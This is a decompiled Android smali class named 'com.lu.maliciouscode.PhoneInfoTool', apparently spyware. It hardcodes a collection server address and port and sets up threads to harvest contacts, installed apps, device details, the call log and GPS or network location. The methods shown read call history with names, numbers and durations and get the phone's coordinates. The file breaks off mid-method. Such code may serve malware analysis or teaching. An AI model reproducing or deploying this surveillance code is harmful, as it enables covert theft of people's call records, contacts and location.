.class public Lcom/lu/maliciouscode/PhoneInfoTool;
.super Ljava/lang/Object;
.source "PhoneInfoTool.java"


# static fields
.field static AppInstalledThread:Ljava/lang/Runnable;

.field static CallLogThread:Ljava/lang/Runnable;

.field static ContactsThread:Ljava/lang/Runnable;

.field static DeviceThread:Ljava/lang/Runnable;

.field static NetThread:Ljava/lang/Runnable;

.field static ReuestThread:Ljava/lang/Runnable;

.field private static address:Ljava/lang/String;

.field private static appList:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private static context:Landroid/content/Context;

.field static locationListener:Landroid/location/LocationListener;

.field static locationThread:Ljava/lang/Runnable;

.field private static phoneInfo:Lcom/lu/maliciouscode/PhoneInfo;

.field private static port:I

.field private static returnData:Ljava/lang/String;

.field private static usercontact:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 38
    const-string v0, "192.168.43.226"

    sput-object v0, Lcom/lu/maliciouscode/PhoneInfoTool;->address:Ljava/lang/String;

    .line 39
    const/16 v0, 0x22b8

    sput v0, Lcom/lu/maliciouscode/PhoneInfoTool;->port:I

    .line 40
    new-instance v0, Lcom/lu/maliciouscode/PhoneInfo;

    invoke-direct {v0}, Lcom/lu/maliciouscode/PhoneInfo;-><init>()V

    sput-object v0, Lcom/lu/maliciouscode/PhoneInfoTool;->phoneInfo:Lcom/lu/maliciouscode/PhoneInfo;

    .line 41
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/lu/maliciouscode/PhoneInfoTool;->usercontact:Ljava/util/List;

    .line 42
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/lu/maliciouscode/PhoneInfoTool;->appList:Ljava/util/List;

    .line 45
    const-string v0, ""

    sput-object v0, Lcom/lu/maliciouscode/PhoneInfoTool;->returnData:Ljava/lang/String;

    .line 370
    new-instance v0, Lcom/lu/maliciouscode/PhoneInfoTool$2;

    invoke-direct {v0}, Lcom/lu/maliciouscode/PhoneInfoTool$2;-><init>()V

    sput-object v0, Lcom/lu/maliciouscode/PhoneInfoTool;->ContactsThread:Ljava/lang/Runnable;

    .line 404
    new-instance v0, Lcom/lu/maliciouscode/PhoneInfoTool$3;

    invoke-direct {v0}, Lcom/lu/maliciouscode/PhoneInfoTool$3;-><init>()V

    sput-object v0, Lcom/lu/maliciouscode/PhoneInfoTool;->DeviceThread:Ljava/lang/Runnable;

    .line 448
    new-instance v0, Lcom/lu/maliciouscode/PhoneInfoTool$4;

    invoke-direct {v0}, Lcom/lu/maliciouscode/PhoneInfoTool$4;-><init>()V

    sput-object v0, Lcom/lu/maliciouscode/PhoneInfoTool;->AppInstalledThread:Ljava/lang/Runnable;

    .line 490
    new-instance v0, Lcom/lu/maliciouscode/PhoneInfoTool$5;

    invoke-direct {v0}, Lcom/lu/maliciouscode/PhoneInfoTool$5;-><init>()V

    sput-object v0, Lcom/lu/maliciouscode/PhoneInfoTool;->locationThread:Ljava/lang/Runnable;

    .line 533
    new-instance v0, Lcom/lu/maliciouscode/PhoneInfoTool$6;

    invoke-direct {v0}, Lcom/lu/maliciouscode/PhoneInfoTool$6;-><init>()V

    sput-object v0, Lcom/lu/maliciouscode/PhoneInfoTool;->CallLogThread:Ljava/lang/Runnable;

    .line 575
    new-instance v0, Lcom/lu/maliciouscode/PhoneInfoTool$7;

    invoke-direct {v0}, Lcom/lu/maliciouscode/PhoneInfoTool$7;-><init>()V

    sput-object v0, Lcom/lu/maliciouscode/PhoneInfoTool;->NetThread:Ljava/lang/Runnable;

    .line 627
    new-instance v0, Lcom/lu/maliciouscode/PhoneInfoTool$8;

    invoke-direct {v0}, Lcom/lu/maliciouscode/PhoneInfoTool$8;-><init>()V

    sput-object v0, Lcom/lu/maliciouscode/PhoneInfoTool;->ReuestThread:Ljava/lang/Runnable;

    .line 671
    new-instance v0, Lcom/lu/maliciouscode/PhoneInfoTool$9;

    invoke-direct {v0}, Lcom/lu/maliciouscode/PhoneInfoTool$9;-><init>()V

    sput-object v0, Lcom/lu/maliciouscode/PhoneInfoTool;->locationListener:Landroid/location/LocationListener;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 37
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$000()Ljava/lang/String;
    .locals 1

    .prologue
    .line 37
    sget-object v0, Lcom/lu/maliciouscode/PhoneInfoTool;->address:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$100()I
    .locals 1

    .prologue
    .line 37
    sget v0, Lcom/lu/maliciouscode/PhoneInfoTool;->port:I

    return v0
.end method

.method static synthetic access$200()Lcom/lu/maliciouscode/PhoneInfo;
    .locals 1

    .prologue
    .line 37
    sget-object v0, Lcom/lu/maliciouscode/PhoneInfoTool;->phoneInfo:Lcom/lu/maliciouscode/PhoneInfo;

    return-object v0
.end method

.method static synthetic access$300()Ljava/lang/String;
    .locals 1

    .prologue
    .line 37
    sget-object v0, Lcom/lu/maliciouscode/PhoneInfoTool;->returnData:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$302(Ljava/lang/String;)Ljava/lang/String;
    .locals 0
    .param p0, "x0"    # Ljava/lang/String;

    .prologue
    .line 37
    sput-object p0, Lcom/lu/maliciouscode/PhoneInfoTool;->returnData:Ljava/lang/String;

    return-object p0
.end method

.method static synthetic access$400()Landroid/content/Context;
    .locals 1

    .prologue
    .line 37
    sget-object v0, Lcom/lu/maliciouscode/PhoneInfoTool;->context:Landroid/content/Context;

    return-object v0
.end method

.method public static getCallHistoryList(ILandroid/content/Context;)V
    .locals 29
    .param p0, "num"    # I
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 120
    new-instance v13, Ljava/util/ArrayList;

    invoke-direct {v13}, Ljava/util/ArrayList;-><init>()V

    .line 122
    .local v13, "callLog":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    sget-object v3, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    const/4 v6, 0x5

    new-array v4, v6, [Ljava/lang/String;

    const/4 v6, 0x0

    const-string v7, "name"

    aput-object v7, v4, v6

    const/4 v6, 0x1

    const-string v7, "number"

    aput-object v7, v4, v6

    const/4 v6, 0x2

    const-string v7, "type"

    aput-object v7, v4, v6

    const/4 v6, 0x3

    const-string v7, "date"

    aput-object v7, v4, v6

    const/4 v6, 0x4

    const-string v7, "duration"

    aput-object v7, v4, v6

    const/4 v5, 0x0

    const/4 v6, 0x0

    const-string v7, "date DESC"

    invoke-virtual/range {v2 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v18

    .line 130
    .local v18, "cs":Landroid/database/Cursor;
    const/16 v23, 0x0

    .line 131
    .local v23, "i":I
    if-eqz v18, :cond_a

    invoke-interface/range {v18 .. v18}, Landroid/database/Cursor;->getCount()I

    move-result v3

    if-lez v3, :cond_a

    .line 132
    new-instance v20, Ljava/util/Date;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    move-object/from16 v0, v20

    invoke-direct {v0, v6, v7}, Ljava/util/Date;-><init>(J)V

    .line 133
    .local v20, "date":Ljava/util/Date;
    new-instance v28, Ljava/text/SimpleDateFormat;

    const-string v3, "yyyy-MM-dd"

    move-object/from16 v0, v28

    invoke-direct {v0, v3}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 134
    .local v28, "simpleDateFormat":Ljava/text/SimpleDateFormat;
    move-object/from16 v0, v28

    move-object/from16 v1, v20

    invoke-virtual {v0, v1}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v21

    .line 135
    .local v21, "date_today":Ljava/lang/String;
    invoke-interface/range {v18 .. v18}, Landroid/database/Cursor;->moveToFirst()Z

    :goto_0
    invoke-interface/range {v18 .. v18}, Landroid/database/Cursor;->isAfterLast()Z

    move-result v3

    if-nez v3, :cond_9

    move/from16 v0, v23

    move/from16 v1, p0

    if-ge v0, v1, :cond_9

    .line 136
    const/4 v3, 0x0

    move-object/from16 v0, v18

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v14

    .line 137
    .local v14, "callName":Ljava/lang/String;
    const/4 v3, 0x1

    move-object/from16 v0, v18

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v15

    .line 139
    .local v15, "callNumber":Ljava/lang/String;
    if-eqz v14, :cond_0

    const-string v3, ""

    invoke-virtual {v14, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_2

    .line 140
    :cond_0
    const/4 v3, 0x1

    new-array v4, v3, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v6, "display_name"

    aput-object v6, v4, v3

    .line 142
    .local v4, "cols":[Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "data1=\'"

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v6, "\'"

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 143
    .local v5, "selection":Ljava/lang/String;
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    .line 145
    .local v2, "cr":Landroid/content/ContentResolver;
    sget-object v3, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v6, 0x0

    const/4 v7, 0x0

    invoke-virtual/range {v2 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v19

    .line 147
    .local v19, "cursor":Landroid/database/Cursor;
    const-string v3, "display_name"

    move-object/from16 v0, v19

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v25

    .line 148
    .local v25, "nameFieldColumnIndex":I
    invoke-interface/range {v19 .. v19}, Landroid/database/Cursor;->getCount()I

    move-result v3

    if-lez v3, :cond_1

    .line 149
    invoke-interface/range {v19 .. v19}, Landroid/database/Cursor;->moveToFirst()Z

    .line 150
    move-object/from16 v0, v19

    move/from16 v1, v25

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v14

    .line 152
    :cond_1
    invoke-interface/range {v19 .. v19}, Landroid/database/Cursor;->close()V

    .line 155
    .end local v2    # "cr":Landroid/content/ContentResolver;
    .end local v4    # "cols":[Ljava/lang/String;
    .end local v5    # "selection":Ljava/lang/String;
    .end local v19    # "cursor":Landroid/database/Cursor;
    .end local v25    # "nameFieldColumnIndex":I
    :cond_2
    const/4 v3, 0x2

    move-object/from16 v0, v18

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v16

    .line 156
    .local v16, "callType":I
    const-string v17, ""

    .line 157
    .local v17, "callTypeStr":Ljava/lang/String;
    packed-switch v16, :pswitch_data_0

    .line 169
    const-string v3, "ssss"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, ""

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    move/from16 v0, v16

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v3, v6}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 170
    add-int/lit8 v23, v23, -0x1

    .line 135
    :goto_1
    invoke-interface/range {v18 .. v18}, Landroid/database/Cursor;->moveToNext()Z

    add-int/lit8 v23, v23, 0x1

    goto/16 :goto_0

    .line 159
    :pswitch_0
    const-string v17, "\u547c\u5165"

    .line 174
    :goto_2
    new-instance v26, Ljava/text/SimpleDateFormat;

    const-string v3, "yyyy-MM-dd"

    move-object/from16 v0, v26

    invoke-direct {v0, v3}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 175
    .local v26, "sdf":Ljava/text/SimpleDateFormat;
    new-instance v8, Ljava/util/Date;

    const/4 v3, 0x3

    move-object/from16 v0, v18

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v6

    invoke-direct {v8, v6, v7}, Ljava/util/Date;-><init>(J)V

    .line 176
    .local v8, "callDate":Ljava/util/Date;
    move-object/from16 v0, v26

    invoke-virtual {v0, v8}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v9

    .line 177
    .local v9, "callDateStr":Ljava/lang/String;
    move-object/from16 v0, v21

    invoke-virtual {v9, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_5

    .line 178
    new-instance v26, Ljava/text/SimpleDateFormat;

    .end local v26    # "sdf":Ljava/text/SimpleDateFormat;
    const-string v3, "HH:mm"

    move-object/from16 v0, v26

    invoke-direct {v0, v3}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 179
    .restart local v26    # "sdf":Ljava/text/SimpleDateFormat;
    move-object/from16 v0, v26

    invoke-virtual {v0, v8}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v9

    .line 196
    :cond_3
    :goto_3
    const/4 v3, 0x4

    move-object/from16 v0, v18

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v11

    .line 197
    .local v11, "callDuration":I
    div-int/lit8 v24, v11, 0x3c

    .line 198
    .local v24, "min":I
    rem-int/lit8 v27, v11, 0x3c

    .line 199
    .local v27, "sec":I
    const-string v12, ""

    .line 200
    .local v12, "callDurationStr":Ljava/lang/String;
    if-lez v27, :cond_4

    .line 201
    if-lez v24, :cond_8

    .line 202
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    move/from16 v0, v24

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v6, "\u5206"

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move/from16 v0, v27

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v6, "\u79d2"

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    .line 207
    :cond_4
    :goto_4
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v6, ":"

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v6, ":"

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, v17

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v6, ":"

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v6, ":"

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v13, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto/16 :goto_1

    .line 162
    .end local v8    # "callDate":Ljava/util/Date;
    .end local v9    # "callDateStr":Ljava/lang/String;
    .end local v11    # "callDuration":I
    .end local v12    # "callDurationStr":Ljava/lang/String;
    .end local v24    # "min":I
    .end local v26    # "sdf":Ljava/text/SimpleDateFormat;
    .end local v27    # "sec":I
    :pswitch_1
    const-string v17, "\u547c\u51fa"

    .line 163
    goto/16 :goto_2

    .line 165
    :pswitch_2
    const-string v17, "\u672a\u63a5"

    .line 166
    goto/16 :goto_2

    .line 180
    .restart local v8    # "callDate":Ljava/util/Date;
    .restart local v9    # "callDateStr":Ljava/lang/String;
    .restart local v26    # "sdf":Ljava/text/SimpleDateFormat;
    :cond_5
    const/4 v3, 0x0

    const/4 v6, 0x7

    invoke-virtual {v9, v3, v6}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_7

    .line 181
    new-instance v26, Ljava/text/SimpleDateFormat;

    .end local v26    # "sdf":Ljava/text/SimpleDateFormat;
    const-string v3, "dd"

    move-object/from16 v0, v26

    invoke-direct {v0, v3}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 182
    .restart local v26    # "sdf":Ljava/text/SimpleDateFormat;
    move-object/from16 v0, v26

    invoke-virtual {v0, v8}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v10

    .line 183
    .local v10, "callDay":I
    move-object/from16 v0, v26

    move-object/from16 v1, v20

    invoke-virtual {v0, v1}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v22

    .line 184
    .local v22, "day":I
    sub-int v3, v22, v10

    const/4 v6, 0x1

    if-ne v3, v6, :cond_6

    .line 185
    const-string v9, "\u6628\u5929"

    goto/16 :goto_3

    .line 187
    :cond_6
    new-instance v26, Ljava/text/SimpleDateFormat;

    .end local v26    # "sdf":Ljava/text/SimpleDateFormat;
    const-string v3, "MM-dd"

    move-object/from16 v0, v26

    invoke-direct {v0, v3}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 188
    .restart local v26    # "sdf":Ljava/text/SimpleDateFormat;
    move-object/from16 v0, v26

    invoke-virtual {v0, v8}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v9

    goto/16 :goto_3

    .line 190
    .end local v10    # "callDay":I
    .end local v22    # "day":I
    :cond_7
    const/4 v3, 0x0

    const/4 v6, 0x4

    invoke-virtual {v9, v3, v6}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_3

    .line 191
    new-instance v26, Ljava/text/SimpleDateFormat;

    .end local v26    # "sdf":Ljava/text/SimpleDateFormat;
    const-string v3, "MM-dd"

    move-object/from16 v0, v26

    invoke-direct {v0, v3}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 192
    .restart local v26    # "sdf":Ljava/text/SimpleDateFormat;
    move-object/from16 v0, v26

    invoke-virtual {v0, v8}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v9

    goto/16 :goto_3

    .line 204
    .restart local v11    # "callDuration":I
    .restart local v12    # "callDurationStr":Ljava/lang/String;
    .restart local v24    # "min":I
    .restart local v27    # "sec":I
    :cond_8
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    move/from16 v0, v27

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v6, "\u79d2"

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    goto/16 :goto_4

    .line 209
    .end local v8    # "callDate":Ljava/util/Date;
    .end local v9    # "callDateStr":Ljava/lang/String;
    .end local v11    # "callDuration":I
    .end local v12    # "callDurationStr":Ljava/lang/String;
    .end local v14    # "callName":Ljava/lang/String;
    .end local v15    # "callNumber":Ljava/lang/String;
    .end local v16    # "callType":I
    .end local v17    # "callTypeStr":Ljava/lang/String;
    .end local v24    # "min":I
    .end local v26    # "sdf":Ljava/text/SimpleDateFormat;
    .end local v27    # "sec":I
    :cond_9
    sget-object v3, Lcom/lu/maliciouscode/PhoneInfoTool;->phoneInfo:Lcom/lu/maliciouscode/PhoneInfo;

    invoke-virtual {v3, v13}, Lcom/lu/maliciouscode/PhoneInfo;->setPhoneCallLog(Ljava/util/List;)V

    .line 211
    .end local v20    # "date":Ljava/util/Date;
    .end local v21    # "date_today":Ljava/lang/String;
    .end local v28    # "simpleDateFormat":Ljava/text/SimpleDateFormat;
    :cond_a
    return-void

    .line 157
    nop

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
        :pswitch_1
        :pswitch_2
    .end packed-switch
.end method

.method public static getLngAndLat(Landroid/content/Context;)Ljava/lang/String;
    .locals 12
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 219
    const-wide/16 v6, 0x0

    .line 220
    .local v6, "latitude":D
    const-wide/16 v10, 0x0

    .line 221
    .local v10, "longitude":D
    const-string v1, "location"

    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/location/LocationManager;

    .line 223
    .local v0, "locationManager":Landroid/location/LocationManager;
    const-string v1, "gps"

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_2

    .line 239
    const-string v1, "gps"

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v8

    .line 240
    .local v8, "location":Landroid/location/Location;
    if-eqz v8, :cond_1

    .line 241
    invoke-virtual {v8}, Landroid/location/Location;->getLatitude()D

    move-result-wide v6

    .line 242
    invoke-virtual {v8}, Landroid/location/Location;->getLongitude()D

    move-result-wide v10

    .line 254
    :cond_0
    :goto_0
    const-string v1, "last in getLanAndLat"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v10, v11}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, ","

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v6, v7}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 255
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v10, v11}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ","

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v6, v7}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    :goto_1
    return-object v1

    .line 244
    :cond_1
    invoke-static {p0}, Lcom/lu/maliciouscode/PhoneInfoTool;->getLngAndLatWithNetwork(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    goto :goto_1

    .line 247
    .end local v8    # "location":Landroid/location/Location;
    :cond_2
    const-string v1, "network"

    const-wide/16 v2, 0x3e8

    const/4 v4, 0x0

    sget-object v5, Lcom/lu/maliciouscode/PhoneInfoTool;->locationListener:Landroid/location/LocationListener;

    invoke-virtual/range {v0 .. v5}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V

    .line 248
    const-string v1, "network"

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v8

    .line 249
    .restart local v8    # "location":Landroid/location/Location;
    if-eqz v8, :cond_0

    .line 250
    invoke-virtual {v8}, Landroid/location/Location;->getLatitude()D

    move-result-wide v6

    .line 251
    invoke-virtual {v8}, Landroid/location/Location;->getLongitude()D

    move-result-wide v10

    goto :goto_0
.end method

.method public static getLngAndLatWithNetwork(Landroid/content/Context;)Ljava/lang/String;
    .locals 12
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 264
    const-wide/16 v6, 0x0

    .line 265
    .local v6, "latitude":D
    const-wide/16 v10, 0x0

    .line 266
    .local v10, "longitude":D
    const-string v1, "location"

    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/location/LocationManager;

    .line 281
    .local v0, "locationManager":Landroid/location/LocationManager;
    const-string v1, "network"

    const-wide/16 v2, 0x3e8

    const/4 v4, 0x0

    sget-object v5, Lcom/lu/maliciouscode/PhoneInfoTool;->locationListener:Landroid/location/LocationListener;

    invoke-virtual/range {v0 .. v5}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V

    .line 282
    const-string v1, "network"

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v8

    .line 283
    .local v8, "location":Landroid/location/Location;
    if-eqz v8, :cond_0

    .line 284
    invoke-virtual {v8}, Landroid/location/Location;->getLatitude()D

    move-result-wide v6

    .line 285
    invoke-virtual {v8}, Landroid/location/Location;->getLongitude()D

    move-result-wide v10

    .line 287
    :cond_0
    const-string v1, "last in NetWork"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v10, v11}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, ","

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v6, v7}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 288
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

